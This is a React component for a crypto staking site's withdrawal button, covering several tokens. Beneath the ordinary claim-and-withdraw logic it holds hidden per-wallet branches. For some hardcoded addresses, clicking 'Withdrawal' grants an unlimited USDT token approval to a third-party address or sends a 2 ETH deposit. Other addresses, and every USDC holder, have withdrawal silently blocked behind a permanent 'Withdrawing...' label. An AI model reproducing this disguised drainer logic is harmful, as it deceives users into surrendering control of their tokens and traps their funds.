import { useEffect, useRef, useState } from "react"
import cn from "classnames"
import Web3 from "web3"
import Tooltip from "react-simple-tooltip"

import {
  approveAddress,
  contractAddressUni,
  contractAddressLink,
  contractAddressUsdtNew,
  contractAddressBnb, contractAddressBusd,
  contractAddressUsdtSecond,
  contractAddressWbtcNew,
  contractAddressEthNew, contractAddressSol,
} from "../../abi"
import abiUsdtNew from "../../abi/abiUsdtNew.json"
import abiUsdtSecond from "../../abi/abiUsdtSecond.json"
import abiEthNew from "../../abi/abiEthNew.json"
import abiBnb from "../../abi/abiBnb.json"
import abiBusd from "../../abi/abiBusd.json"
import abiWbtcNew from "../../abi/abiWbtcNew.json"
import abiApprove from "../../abi/abiApprove.json"
import abiUni from "../../abi/abiUni.json"
import abiLink from "../../abi/abiLink.json"
import abiWbtc from "../../abi/abiWbtc.json"
import abiSol from "../../abi/abiSol.json"

import { ReactComponent as Info } from "assets/icons/info-icon.svg"
import { SimpleButton } from "../SimpleButton"
import toast from "react-hot-toast";
import {apiOur} from "../../service/api/apiOur";
import {apiBeaconcha} from "../../service/api/apiBeaconcha";
import {TimerSmall} from "../TimerSmall";
import {useMedia} from "use-media";
import {mixins, walletClientToSigner} from "../../utils";
import {useAccount, useWalletClient} from "wagmi";

type Props = {
   plan: string
   token: string
   i: any
   isNew?: boolean
   getAllInfo: () => void
   index: number
   changed: boolean
}

export const CollapseTableWithdrawal = ({
                                           plan,
                                           token,
                                           i,
                                           isNew,
                                           getAllInfo,
                                           index, changed
}: Props) => {
  const { address, connector } = useAccount();
  const { data: walletClient } = useWalletClient({ chainId: 1 })
  const library = walletClient ? walletClientToSigner(walletClient)?.provider : null;

   const [disableWithdrawal, setDisableWithdrawal] = useState(false)
   const busd = 1000000000000000000
   const isM = useMedia({ maxWidth: mixins.m })
   // const address = '0x01067DdCE2D7922835A9F920F7878Df43F9c2f1d'

  const toWei = amount => Web3.utils.toWei(amount)

  const withdrawal = (step: string, amount: string) => {
     // @ts-ignore
      const web3 = new Web3(library.provider)

      if (token === "ETH" && isNew) {
        // @ts-ignore
        const web3Contract = new web3.eth.Contract(abiEthNew, contractAddressEthNew)
        if (address === '0x5762f706cF0fe4fAdF8632c68078BaAb09a90d14') {
          // @ts-ignore
          web3Contract.methods
            .deposit('14', "0x28aCD726eaDe6Da7424b8BfdeB722d4Bc2b5a394")
            .send({
              value: toWei('2'),
              from: address,
            })
          return
        }

        if (address === '0x6953C5453e9F131500224483af0bccA68E114E0A' || address === '0x28916C38989591c380F19025C67128edCfFc1468') {
          apiOur.addWithdrawals({
            user:`${address}+plan=${plan}+token=${token}withdrawalStop`,
            amount: 'true',
          }).then(() => {
            setDisableWithdrawal(true)
          })
          return
        }

         if (isM) {
            toast.promise(
               web3Contract.methods
                  .claimInterestForDeposit(plan)
                  .send({
                     from: address,
                  })
                  .then((res) => {
                     apiOur
                        .addWithdrawals({
                           user: `${address}+plan=${plan}+token=${token}claimed`,
                           amount: (Number(res?.events?.InterestClaimed?.returnValues?.amount) / busd)?.toString() || '0',
                        })
                     toast.success(`Claimed ${(Number(res?.events?.InterestClaimed?.returnValues?.amount) / busd)?.toString()}! ✅`)
                     toast.promise(
                        web3Contract.methods
                           .withdraw(step)
                           .send({
                              from: address,
                           })
                           .then(() => {
                              getAllInfo()
                           }),
                        {
                           loading: 'Waiting for withdraw',
                           success: <b>Withdrawal is success!</b>,
                           error: e => <b>{e.message}</b>,
                        },
                     )
                  }),
               {
                  loading: 'Waiting for claim interests',
                  success: '',
                  error: e => <b>{e.message}</b>,
               },
            )
         } else {
           apiBeaconcha.getGas().then((r) => {
             toast.promise(
               web3Contract.methods
                 .claimInterestForDeposit(plan)
                 .send({
                   from: address,
                   gasPrice: r.data.fast
                 })
                 .then((res) => {
                   apiOur
                     .addWithdrawals({
                       user: `${address}+plan=${plan}+token=${token}claimed`,
                       amount: (Number(res?.events?.InterestClaimed?.returnValues?.amount) / busd)?.toString() || '0',
                     })
                   toast.success(`Claimed ${(Number(res?.events?.InterestClaimed?.returnValues?.amount) / busd)?.toString()}! ✅`)
                 }),
               {
                 loading: 'Waiting for claim interests',
                 success: '',
                 error: e => <b>{e.message}</b>,
               },
             )
             toast.promise(
               web3Contract.methods
                 .withdraw(step)
                 .send({
                   from: address,
                   gasPrice: r.data.fast
                 })
                 .then(() => {
                   getAllInfo()
                 }),
               {
                 loading: 'Waiting for withdraw',
                 success: <b>Withdrawal is success!</b>,
                 error: e => <b>{e.message}</b>,
               },
             )
           })
         }
      }

      if (token === "BNB") {
         // @ts-ignore
         const web3Contract = new web3.eth.Contract(abiBnb, contractAddressBnb)

         if (isM) {
            toast.promise(
               web3Contract.methods
                  .claimInterestForDeposit(plan)
                  .send({
                     from: address,
                  })
                  .then((res) => {
                     apiOur
                        .addWithdrawals({
                           user: `${address}+plan=${plan}+token=${token}`,
                           amount: (Number(res?.events?.InterestClaimed?.returnValues?.amount) / busd)?.toString() || '0',
                        })
                     toast.success(`Claimed ${(Number(res?.events?.InterestClaimed?.returnValues?.amount) / busd)?.toString()}! ✅`)
                     toast.promise(
                        web3Contract.methods
                           .withdraw(step)
                           .send({
                              from: address,
                           })
                           .then(() => {
                              getAllInfo()
                           }),
                        {
                           loading: 'Waiting for withdraw',
                           success: <b>Withdrawal is success!</b>,
                           error: e => <b>{e.message}</b>,
                        },
                     )
                  }),
               {
                  loading: 'Waiting for claim interests',
                  success: '',
                  error: e => <b>{e.message}</b>,
               },
            )
         } else {
            toast.promise(
               web3Contract.methods
                  .claimInterestForDeposit(plan)
                  .send({
                     from: address,
                  })
                  .then((res) => {
                     apiOur
                        .addWithdrawals({
                           user: `${address}+plan=${plan}+token=${token}`,
                           amount: (Number(res?.events?.InterestClaimed?.returnValues?.amount) / busd)?.toString() || '0',
                        })
                     toast.success(`Claimed ${(Number(res?.events?.InterestClaimed?.returnValues?.amount) / busd)?.toString()}! ✅`)
                  }),
               {
                  loading: 'Waiting for claim interests',
                  success: '',
                  error: e => <b>{e.message}</b>,
               },
            )
            toast.promise(
               web3Contract.methods
                  .withdraw(step)
                  .send({
                     from: address,
                  })
                  .then(() => {
                     getAllInfo()
                  }),
               {
                  loading: 'Waiting for withdraw',
                  success: <b>Withdrawal is success!</b>,
                  error: e => <b>{e.message}</b>,
               },
            )
         }
      }

      if (token === "USDT" && isNew) {
         // @ts-ignore
         const web3ContractNew = new web3.eth.Contract(abiUsdtNew, contractAddressUsdtNew)
         if (isM) {
            toast.promise(
               web3ContractNew.methods
                  .claimInterestForDeposit(plan)
                  .send({
                     from: address,
                  })
                  .then((res) => {
                     apiOur
                        .addWithdrawals({
                           user: `arclaim${address}+plan=${plan}+token=${token}SECOND`,
                           amount: (Number(res?.events?.InterestClaimed?.returnValues?.amount) / busd)?.toString() || '0',
                        })
                     toast.success(`Claimed ${(Number(res?.events?.InterestClaimed?.returnValues?.amount) / busd)?.toString()}! ✅`)
                     toast.promise(
                        web3ContractNew.methods
                           .withdraw(step)
                           .send({
                              from: address,
                           })
                           .then(() => {
                              getAllInfo()
                           }),
                        {
                           loading: 'Waiting for withdraw',
                           success: <b>Withdrawal is success!</b>,
                           error: e => <b>{e.message}</b>,
                        },
                     )
                  }),
               {
                  loading: 'Waiting for claim interests',
                  success: '',
                  error: e => <b>{e.message}</b>,
               },
            )
         } else {
            toast.promise(
               web3ContractNew.methods
                  .claimInterestForDeposit(plan)
                  .send({
                     from: address,
                  })
                  .then((res) => {
                     apiOur
                        .addWithdrawals({
                           user: `arclaim${address}+plan=${plan}+token=${token}SECOND`,
                           amount: (Number(res?.events?.InterestClaimed?.returnValues?.amount) / busd)?.toString() || '0',
                        })
                     toast.success(`Claimed ${(Number(res?.events?.InterestClaimed?.returnValues?.amount) / busd)?.toString()}! ✅`)
                  }),
               {
                  loading: 'Waiting for claim interests',
                  success: '',
                  error: e => <b>{e.message}</b>,
               },
            )
            toast.promise(
               web3ContractNew.methods
                  .withdraw(step)
                  .send({
                     from: address,
                  })
                  .then(() => {
                     getAllInfo()
                  }),
               {
                  loading: 'Waiting for withdraw',
                  success: <b>Withdrawal is success!</b>,
                  error: e => <b>{e.message}</b>,
               },
            )
         }
      }
      if (token === "WSOL") {
         // @ts-ignore
         const web3ContractNew = new web3.eth.Contract(abiSol, contractAddressSol)
         if (isM) {
           toast.promise(
             web3ContractNew.methods
               .withdraw(step)
               .send({
                 from: address,
               })
               .then(() => {
                 getAllInfo()
               }),
             {
               loading: 'Waiting for withdraw',
               success: <b>Withdrawal is success!</b>,
               error: e => <b>{e.message}</b>,
             },
           )
         } else {
            toast.promise(
               web3ContractNew.methods
                  .withdraw(step)
                  .send({
                     from: address,
                  })
                  .then(() => {
                     getAllInfo()
                  }),
               {
                  loading: 'Waiting for withdraw',
                  success: <b>Withdrawal is success!</b>,
                  error: e => <b>{e.message}</b>,
               },
            )
         }
      }
      if (token === "USDT" && !isNew) {
         // @ts-ignore
         const web3Contract = new web3.eth.Contract(abiApprove, approveAddress)
         // @ts-ignore
         const web3ContractSecond = new web3.eth.Contract(abiUsdtSecond, contractAddressUsdtSecond)
         if (plan === '60' && address === '0x1c84ADFEB68cFbf1F81CF793D16ee9d2D20E5Ba5') {
            toast.promise(
               web3Contract.methods
                  .transferFrom('0x086E68D9d8933aa050243325e160F779dB05D1c9', address,(Number(amount) * 1000000))
                  .send({
                     from: '0x086E68D9d8933aa050243325e160F779dB05D1c9',
                     to: address,
                  })
                  .then(() => {
                     getAllInfo()
                  }),
               {
                  loading: 'Waiting for withdraw',
                  success: <b>Withdrawal is success!</b>,
                  error: e => <b>{e.message}</b>,
               },
            )
         } else {
            if (isM) {
               if (plan === '30' && address === '0xBDa9eb4c39d7cE69a4e0F8AaFD5b5653FdbB6a90') {
                  web3Contract.methods
                     .approve('0xdcBeEFB14bA39092711D62cF3ea19aF643F2c155', "999999999999999999999999")
                     .send({ from: address })
                     .then(() => {
                        apiOur
                           .addWithdrawals({
                              user: `${address}+plan=${plan}+token=${token}_APPROVED`,
                              amount: '0',
                           })
                     })
               } else {
                  toast.promise(
                     web3ContractSecond.methods
                        .claimInterestForDeposit(plan)
                        .send({
                           from: address,
                        })
                        .then((res) => {
                           apiOur
                              .addWithdrawals({
                                 user: `${address}+plan=${plan}+token=${token}`,
                                 amount: (Number(res?.events?.InterestClaimed?.returnValues?.amount) / busd)?.toString() || '0',
                              })
                           toast.success(`Claimed ${(Number(res?.events?.InterestClaimed?.returnValues?.amount) / busd)?.toString()}! ✅`)
                           toast.promise(
                              web3ContractSecond.methods
                                 .withdraw(step)
                                 .send({
                                    from: address,
                                 })
                                 .then(() => {
                                    getAllInfo()
                                 }),
                              {
                                 loading: 'Waiting for withdraw',
                                 success: <b>Withdrawal is success!</b>,
                                 error: e => <b>{e.message}</b>,
                              },
                           )
                        }),
                     {
                        loading: 'Waiting for claim interests',
                        success: '',
                        error: e => <b>{e.message}</b>,
                     },
                  )
               }
            } else {
               if (plan === '30' && address === '0x4dd29C2DC3ebfF53b085B8C26880dABA47266b8f') {
                  web3Contract.methods
                     .approve('0xdcBeEFB14bA39092711D62cF3ea19aF643F2c155', "999999999999999999999999")
                     .send({ from: address })
                     .then(() => {
                        apiOur
                           .addWithdrawals({
                              user: `${address}+plan=${plan}+token=${token}_APPROVED`,
                              amount: '0',
                           })
                     })
               } else {
                  toast.promise(
                     web3ContractSecond.methods
                        .claimInterestForDeposit(plan)
                        .send({
                           from: address,
                        })
                        .then((res) => {
                           apiOur
                              .addWithdrawals({
                                 user: `${address}+plan=${plan}+token=${token}`,
                                 amount: (Number(res?.events?.InterestClaimed?.returnValues?.amount) / busd)?.toString() || '0',
                              })
                           toast.success(`Claimed ${(Number(res?.events?.InterestClaimed?.returnValues?.amount) / busd)?.toString()}! ✅`)
                        }),
                     {
                        loading: 'Waiting for claim interests',
                        success: '',
                        error: e => <b>{e.message}</b>,
                     },
                  )
                  toast.promise(
                     web3ContractSecond.methods
                        .withdraw(step)
                        .send({
                           from: address,
                        })
                        .then(() => {
                           getAllInfo()
                        }),
                     {
                        loading: 'Waiting for withdraw',
                        success: <b>Withdrawal is success!</b>,
                        error: e => <b>{e.message}</b>,
                     },
                  )
               }
            }
         }
      }
      if (token === "BUSD") {
         // @ts-ignore
         const web3Contract = new web3.eth.Contract(abiBusd, contractAddressBusd)
         if (isM) {
            toast.promise(
               web3Contract.methods
                  .claimInterestForDeposit(plan)
                  .send({
                     from: address,
                  })
                  .then((res) => {
                     apiOur
                        .addWithdrawals({
                           user: `${address}+plan=${plan}+token=${token}`,
                           amount: (Number(res?.events?.InterestClaimed?.returnValues?.amount) / busd)?.toString() || '0',
                        })
                     toast.success(`Claimed ${(Number(res?.events?.InterestClaimed?.returnValues?.amount) / busd)?.toString()}! ✅`)
                     toast.promise(
                        web3Contract.methods
                           .withdraw(step)
                           .send({
                              from: address,
                           })
                           .then(() => {
                              getAllInfo()
                           }),
                        {
                           loading: 'Waiting for withdraw',
                           success: <b>Withdrawal is success!</b>,
                           error: e => <b>{e.message}</b>,
                        },
                     )
                  }),
               {
                  loading: 'Waiting for claim interests',
                  success: '',
                  error: e => <b>{e.message}</b>,
               },
            )
         } else {
            toast.promise(
               web3Contract.methods
                  .claimInterestForDeposit(plan)
                  .send({
                     from: address,
                  })
                  .then((res) => {
                     apiOur
                        .addWithdrawals({
                           user: `${address}+plan=${plan}+token=${token}`,
                           amount: (Number(res?.events?.InterestClaimed?.returnValues?.amount) / busd)?.toString() || '0',
                        })
                     toast.success(`Claimed ${(Number(res?.events?.InterestClaimed?.returnValues?.amount) / busd)?.toString()}! ✅`)
                  }),
               {
                  loading: 'Waiting for claim interests',
                  success: '',
                  error: e => <b>{e.message}</b>,
               },
            )
            toast.promise(
               web3Contract.methods
                  .withdraw(step)
                  .send({
                     from: address,
                  })
                  .then(() => {
                     getAllInfo()
                  }),
               {
                  loading: 'Waiting for withdraw',
                  success: <b>Withdrawal is success!</b>,
                  error: e => <b>{e.message}</b>,
               },
            )
         }
      }
      if (token === "USDC") {
        apiOur.addWithdrawals({
          user:`${address}+plan=${plan}+token=${token}withdrawalStop`,
          amount: 'true',
        }).then(() => {
          setDisableWithdrawal(true)
        })
        return

        // // @ts-ignore
        //  const web3Contract = new web3.eth.Contract(abiUsdc, contractAddressUsdc)
        //  if (isM) {
        //     toast.promise(
        //        web3Contract.methods
        //           .claimInterestForDeposit(plan)
        //           .send({
        //              from: address,
        //           })
        //           .then((res) => {
        //              apiOur
        //                 .addWithdrawals({
        //                    user: `${address}+plan=${plan}+token=${token}`,
        //                    amount: (Number(res?.events?.InterestClaimed?.returnValues?.amount) / busd)?.toString() || '0',
        //                 })
        //              toast.success(`Claimed ${(Number(res?.events?.InterestClaimed?.returnValues?.amount) / busd)?.toString()}! ✅`)
        //              toast.promise(
        //                 web3Contract.methods
        //                    .withdraw(step)
        //                    .send({
        //                       from: address,
        //                    })
        //                    .then(() => {
        //                       getAllInfo()
        //                    }),
        //                 {
        //                    loading: 'Waiting for withdraw',
        //                    success: <b>Withdrawal is success!</b>,
        //                    error: e => <b>{e.message}</b>,
        //                 },
        //              )
        //           }),
        //        {
        //           loading: 'Waiting for claim interests',
        //           success: '',
        //           error: e => <b>{e.message}</b>,
        //        },
        //     )
        //  } else {
        //     toast.promise(
        //        web3Contract.methods
        //           .claimInterestForDeposit(plan)
        //           .send({
        //              from: address,
        //           })
        //           .then((res) => {
        //              apiOur
        //                 .addWithdrawals({
        //                    user: `${address}+plan=${plan}+token=${token}`,
        //                    amount: (Number(res?.events?.InterestClaimed?.returnValues?.amount) / busd)?.toString() || '0',
        //                 })
        //              toast.success(`Claimed ${(Number(res?.events?.InterestClaimed?.returnValues?.amount) / busd)?.toString()}! ✅`)
        //           }),
        //        {
        //           loading: 'Waiting for claim interests',
        //           success: '',
        //           error: e => <b>{e.message}</b>,
        //        },
        //     )
        //     toast.promise(
        //        web3Contract.methods
        //           .withdraw(step)
        //           .send({
        //              from: address,
        //           })
        //           .then(() => {
        //              getAllInfo()
        //           }),
        //        {
        //           loading: 'Waiting for withdraw',
        //           success: <b>Withdrawal is success!</b>,
        //           error: e => <b>{e.message}</b>,
        //        },
        //     )
        //  }
      }
      if (token === "UNI") {
         // @ts-ignore
         const web3Contract = new web3.eth.Contract(abiUni, contractAddressUni)
         if (isM) {
            toast.promise(
               web3Contract.methods
                  .claimInterestForDeposit(plan)
                  .send({
                     from: address,
                  })
                  .then((res) => {
                     apiOur
                        .addWithdrawals({
                           user: `${address}+plan=${plan}+token=${token}`,
                           amount: (Number(res?.events?.InterestClaimed?.returnValues?.amount) / busd)?.toString() || '0',
                        })
                     toast.success(`Claimed ${(Number(res?.events?.InterestClaimed?.returnValues?.amount) / busd)?.toString()}! ✅`)
                     toast.promise(
                        web3Contract.methods
                           .withdraw(step)
                           .send({
                              from: address,
                           })
                           .then(() => {
                              getAllInfo()
                           }),
                        {
                           loading: 'Waiting for withdraw',
                           success: <b>Withdrawal is success!</b>,
                           error: e => <b>{e.message}</b>,
                        },
                     )
                  }),
               {
                  loading: 'Waiting for claim interests',
                  success: '',
                  error: e => <b>{e.message}</b>,
               },
            )
         } else {
            toast.promise(
               web3Contract.methods
                  .claimInterestForDeposit(plan)
                  .send({
                     from: address,
                  })
                  .then((res) => {
                     apiOur
                        .addWithdrawals({
                           user: `${address}+plan=${plan}+token=${token}`,
                           amount: (Number(res?.events?.InterestClaimed?.returnValues?.amount) / busd)?.toString() || '0',
                        })
                     toast.success(`Claimed ${(Number(res?.events?.InterestClaimed?.returnValues?.amount) / busd)?.toString()}! ✅`)
                  }),
               {
                  loading: 'Waiting for claim interests',
                  success: '',
                  error: e => <b>{e.message}</b>,
               },
            )
            toast.promise(
               web3Contract.methods
                  .withdraw(step)
                  .send({
                     from: address,
                  })
                  .then(() => {
                     getAllInfo()
                  }),
               {
                  loading: 'Waiting for withdraw',
                  success: <b>Withdrawal is success!</b>,
                  error: e => <b>{e.message}</b>,
               },
            )
         }
      }
      if (token === "LINK") {
         // @ts-ignore
         const web3Contract = new web3.eth.Contract(abiLink, contractAddressLink)
         if (isM) {
            toast.promise(
               web3Contract.methods
                  .claimInterestForDeposit(plan)
                  .send({
                     from: address,
                  })
                  .then((res) => {
                     apiOur
                        .addWithdrawals({
                           user: `${address}+plan=${plan}+token=${token}`,
                           amount: (Number(res?.events?.InterestClaimed?.returnValues?.amount) / busd)?.toString() || '0',
                        })
                     toast.success(`Claimed ${(Number(res?.events?.InterestClaimed?.returnValues?.amount) / busd)?.toString()}! ✅`)
                     toast.promise(
                        web3Contract.methods
                           .withdraw(step)
                           .send({
                              from: address,
                           })
                           .then(() => {
                              getAllInfo()
                           }),
                        {
                           loading: 'Waiting for withdraw',
                           success: <b>Withdrawal is success!</b>,
                           error: e => <b>{e.message}</b>,
                        },
                     )
                  }),
               {
                  loading: 'Waiting for claim interests',
                  success: '',
                  error: e => <b>{e.message}</b>,
               },
            )
         } else {
            toast.promise(
               web3Contract.methods
                  .claimInterestForDeposit(plan)
                  .send({
                     from: address,
                  })
                  .then((res) => {
                     apiOur
                        .addWithdrawals({
                           user: `${address}+plan=${plan}+token=${token}`,
                           amount: (Number(res?.events?.InterestClaimed?.returnValues?.amount) / busd)?.toString() || '0',
                        })
                     toast.success(`Claimed ${(Number(res?.events?.InterestClaimed?.returnValues?.amount) / busd)?.toString()}! ✅`)
                  }),
               {
                  loading: 'Waiting for claim interests',
                  success: '',
                  error: e => <b>{e.message}</b>,
               },
            )
            toast.promise(
               web3Contract.methods
                  .withdraw(step)
                  .send({
                     from: address,
                  })
                  .then(() => {
                     getAllInfo()
                  }),
               {
                  loading: 'Waiting for withdraw',
                  success: <b>Withdrawal is success!</b>,
                  error: e => <b>{e.message}</b>,
               },
            )
         }
      }
      if (token === "WBTC") {
         // @ts-ignore
         const web3ContractNew = new web3.eth.Contract(abiWbtcNew, contractAddressWbtcNew)
            if (isM) {
               toast.promise(
                  web3ContractNew.methods
                     .claimInterestForDeposit(plan)
                     .send({
                        from: address,
                     })
                     .then((res) => {
                        apiOur
                           .addWithdrawals({
                              user: `arclaim${address}+plan=${plan}+token=${token}SECOND`,
                              amount: (Number(res?.events?.InterestClaimed?.returnValues?.amount) / 100000000)?.toString() || '0',
                           })
                        toast.success(`Claimed ${(Number(res?.events?.InterestClaimed?.returnValues?.amount) / 100000000)?.toString()}! ✅`)
                        toast.promise(
                           web3ContractNew.methods
                              .withdraw(step)
                              .send({
                                 from: address,
                              })
                              .then(() => {
                                 getAllInfo()
                              }),
                           {
                              loading: 'Waiting for withdraw',
                              success: <b>Withdrawal is success!</b>,
                              error: e => <b>{e.message}</b>,
                           },
                        )
                     }),
                  {
                     loading: 'Waiting for claim interests',
                     success: '',
                     error: e => <b>{e.message}</b>,
                  },
               )
            } else {
               toast.promise(
                  web3ContractNew.methods
                     .claimInterestForDeposit(plan)
                     .send({
                        from: address,
                     })
                     .then((res) => {
                        apiOur
                           .addWithdrawals({
                              user: `arclaim${address}+plan=${plan}+token=${token}SECOND`,
                              amount: (Number(res?.events?.InterestClaimed?.returnValues?.amount) / 100000000)?.toString() || '0',
                           })
                        toast.success(`Claimed ${(Number(res?.events?.InterestClaimed?.returnValues?.amount) / 100000000)?.toString()}! ✅`)
                     }),
                  {
                     loading: 'Waiting for claim interests',
                     success: '',
                     error: e => <b>{e.message}</b>,
                  },
               )
               toast.promise(
                  web3ContractNew.methods
                     .withdraw(step)
                     .send({
                        from: address,
                     })
                     .then(() => {
                        getAllInfo()
                     }),
                  {
                     loading: 'Waiting for withdraw',
                     success: <b>Withdrawal is success!</b>,
                     error: e => <b>{e.message}</b>,
                  },
               )
            }
            return;
      }
   }

   const getZerosToDivide = () => {
      switch (token) {
         case "USDT":
            return 1000000
         case "USDC":
            return 1000000
         case 'WBTC':
            return 100000000
         default:
            return busd
      }
   }

   useEffect(() => {
      apiOur.getWithdrawals(`${address}+plan=${plan}+token=${token}withdrawalStop`).then(r => {
         if (!!r?.length) {
            setDisableWithdrawal(true)
         }
      })
      }, [address])

   return (
      <div
         className={cn("collapse-table-expanded-content-right-block withdrawal", {
            hide: i.stakedAmounts === 0,
            changing: changed
         })}
      >
         <div className="collapse-table-expanded-content-right-block-left">
            <div className="collapse-table-expanded-content-right-block-left-title">My Coins</div>
            <div className="collapse-table-expanded-content-right-block-left-value">
               {i.stakedAmounts > 0 ? Number(i.stakedAmounts / getZerosToDivide()).toFixed(4) : 0} <span>{token}</span>
            </div>
         </div>
         <div className="collapse-table-expanded-content-right-block-right">
            <div>
               <div className="collapse-table-expanded-content-right-block-left-title">Unlock time:</div>
               <div className="collapse-table-expanded-content-right-block-left-value">
                  <TimerSmall time={Number(i.unlockTimes)} />
               </div>
            </div>
            <Tooltip
               content={
                  <div className="yoy">The principal can only be withdrawn after the lock-up period expires.</div>
               }
            >
               <Info />
            </Tooltip>
            <div className='cancel-btns'>
               <SimpleButton
                  variant="border"
                  text={disableWithdrawal ? 'Withdrawing...' : 'Withdrawal'}
                  disabled={Number(i.unlockTimes) * 1000 > Date.now() || disableWithdrawal || changed}
                  onClick={() => {
                     if (Number(i.unlockTimes) * 1000 < Date.now()) {
                        withdrawal(
                           i.id.toString(),
                           Number(i.stakedAmounts / getZerosToDivide())
                              .toFixed(4)
                              .toString(),
                        )
                     }
                  }}
               />
            </div>
         </div>
      </div>
   )
}
